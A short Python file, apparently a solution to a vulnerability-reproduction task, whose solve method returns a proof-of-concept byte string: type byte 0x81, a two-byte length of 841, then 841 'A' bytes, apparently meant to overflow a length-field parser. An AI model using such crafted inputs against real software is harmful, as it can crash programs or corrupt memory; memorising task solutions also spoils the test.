class Solution:
    def solve(self, src_path: str) -> bytes:
        length = 841
        type_byte = 0x81
        len_high = (length >> 8) & 0xFF
        len_low = length & 0xFF
        value = b'A' * length
        poc = bytes([type_byte]) + bytes([len_high]) + bytes([len_low]) + value
        return poc